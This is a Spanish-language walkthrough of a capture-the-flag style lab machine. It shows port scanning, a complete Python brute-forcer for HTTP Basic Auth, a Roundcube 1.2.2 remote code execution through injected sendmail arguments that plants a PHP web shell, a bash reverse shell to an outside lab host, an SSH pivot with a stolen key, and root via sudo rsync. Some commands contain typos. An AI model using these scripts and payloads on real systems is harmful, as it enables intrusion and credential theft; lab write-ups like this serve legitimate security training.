1. Escaneo de puertos 
```
nmap -p- --open -sCS --min-rate 5000 -Pn -n -vvv 192.168.77.90 -oN nmap/openPorts
```
Impresión
```java
Discovered open port 80/tcp on 192.168.77.90
Discovered open port 993/tcp on 192.168.77.90
Discovered open port 143/tcp on 192.168.77.90
```

2. Ataque de fuerza bruta 
```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.77.90
```
Impresión 
```
/zmail                (Status: 401) [Size: 460]
```
**Nota:** Al colocar este directorio en la URL de la web, abre un apartado para registrarse, de este modo faltan usuarios potenciales y contraseña, pues los usuarios se encuentran por la cara en la primera pagina y de contraseñas el `rockyou`

3. Enviar credenciales incorrectas e interceptarlas con burpsuit 
4. Crear un script en Python como herramienta de fuerza bruta para probar contraseñas
```python
#!/usr/bin/python3
#Script para fuerza bruta a credenciales

import requests
import sys
import signal
import time
import pdb
#Codificación y decodificacion en base64
from base64 import b64encode
from base64 import b64decode
from pwn import *

#Ctrl + C
def def_handler(signal, frame):
	print("\n\n[!] Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

#Variable con la URL
main_url = "http://192.168.77.90/zmail"

#Function validar password con status code diferente a 401
def makeAuthentication(combination_b64, p1):
	combination_b64 = combination_b64.decode()
	#Estructura para la furaza bruta segun el burpsuit
	headers = {
		'Authorization': 'Basic %s' % combination_b64
	}
	#Petición por GET
	r = requests.get(main_url, headers=headers)
	if r.status_code != 401:
		p1.success("La contraseña correcta es: %s" % (b64decode(combination_b64)).decode())
		sys.exit(0)

def makeAuthorization():
	#Lista de usuarios potenciales
	users = ["deez1", "p48", "all2"]
	#Diccionario ROCKYOU.TXT
	f = open("/usr/share/wordlists/rockyou.txt", "rb")
	#Barra de progreso
	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")
	time.sleep(2)
	counter = 1
	#Ciclo para cifrar el password en base64
	for password in f.readlines():
		password = (password.strip()).decode()
		#Estructura que debe tener admin:admin
		combination = users[1] + ':' + password
		#Mostrando barra de estado
		p1.status("Probando con la contraseña [%d/14344392]: %s" % (counter, combination.split(':')[1]))
		combination_b64 = b64encode(combination.encode())
		makeAuthentication(combination_b64, p1)
		counter += 1

#Function Main
if __name__ == '__main__':
	makeAuthorization()
```

5. De este modo se encuentra la contraseña `p48:electrico`, ingresar
6. Buscar la versión del  `roundcube` que se encuentra en el `About`
```

## Roundcube 1.2.2
```
Identificada la versión buscar una vulnerabilidad en `searchsploit`

7. Existe una vulnerabilidad de `Remote Code Execution`, descargarla. Según el script es posible enviar un correo, interceptarlo y editarlo los siguientes espacios
```
04731 <<< Subject: <?php phpinfo(); ?>
04731 <<< X-PHP-Originating-Script: 1000:rcube.php
04731 <<< MIME-Version: 1.0
04731 <<< Content-Type: text/plain; charset=US-ASCII;
04731 <<<  format=flowed
04731 <<< Content-Transfer-Encoding: 7bit
04731 <<< Date: So, 20 Nov 2016 04:02:52 +0100
04731 <<< From: example@example.com -OQueueDirectory=/tmp
```
**Nota:** Utilizar los espacios como '+' para evitar errores, de la siguiente manera.

8. Editar la petición interceptada por BurbSuit. Petición sin editar...
```c
_token=kcCVHIDxlZxdWNumpsajKbjtAoVe1q3j&_task=mail&_action=send&_id=50779226666e08a65a1727&_attachments=&_from=1&_to=hola%40hola.com&_cc=&_bcc=&_replyto=&_followupto=&_subject=hola&editorSelector=plain&_priority=0&_store_target=Sent&_draft_saveid=&_draft=&_is_html=0&_framed=1&_message=como+fue
```

9. Editar los campos `for=1` y `subject=h`, de la siguiente manera
```c
_token=kcCVHIDxlZxdWNumpsajKbjtAoVe1q3j&_task=mail&_action=send&_id=151308979966e08d658ea70&_attachments=&_from=hola@hola.com+-OQueueDirectory=/tmp+-X/var/www/html/rce.php&_to=hola%40hola.com&_cc=&_bcc=&_replyto=&_followupto=&_subject=<?php+system($_GET['cmd'])?>&editorSelector=plain&_priority=0&_store_target=Sent&_draft_saveid=&_draft=&_is_html=0&_framed=1&_message=comofue
```

10. Enviar la petición, luego habrá un archivo que acabamos de crear en la ruta `http://192.168.77.76/rce.php`. Para interactuar con la consola, hacemos `http://192.168.77.76/rce.php?cmd=whoami` 
11. Implementar una ReverShell 
```
bash -c "/bin/bash -i >& /dev/tcp/192.168.77.162/443 0>&1"
```
URLcode
```
http://192.168.77.76/rce.php?cmd=bash -c "/bin/bash -i >%26 /dev/tcp/192.168.77.162/443 0>%261"
```

12. Tratamiento de la TTI 
```
script /dev/null -c bash
Crl + z
$ stty raw -echo; fg
$ reset xterm
$ export SHEEL=bash
$ export TERM=xterm
```

13. Entrar con el usuario `p48` y buscar el archivo `~/preivkey.gpg`
14. Utilizando un desencriptador de contraseñas SSH web 
```
https://pgptool.org
```
- Buscar la opción de `Decrypt (+Verify)`
- Copiar y pegar la clave privada que se encuentra dentro del equipo de la maquina victima
- Copiar y pegar el mensaje privado que se encuentra al comienzo de la pagina web en un foro
- Utilizar como clave para descifrar `electrico`

**Nota:** Dentro del mensaje en el foro de la primera pagina dentro del servidor, habla sobre un `backup dentro de la misma red`, así que...

15. Crear una clave privada con el mensaje desencriptado 
```
nano id_rsa
chmod 600 id_rsa
```

16. Conocer la ip de la sub-red 
```
hostname -I
192.168.144.1 172.17.0.1 
```

La `172.17.0.1` es la red interna, por lo tanto una maquina desplegada dentro de la misma red seria `172.17.0.2` para comprobar que la sub-red existe se el envía un paquete
```
ping -c 1 172.17.0.2
```

17.  Con `ss -nlt` identificar que puestos están abiertos
```
LISTEN           0    128       172.17.0.1:22 
```
El puesto 22 en escucha

18. Utilizar la clave para conectarse al usuario `p48` por ssh
```
ssh -i id_rsa p48/172.17.0.2
```

19. Estando adentro utilizar el comando `sudo -l` para buscar binarios
```
(root) NOPASSWD: /usr/bin/rsync
```
Buscar en `GTFObins`
```
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```
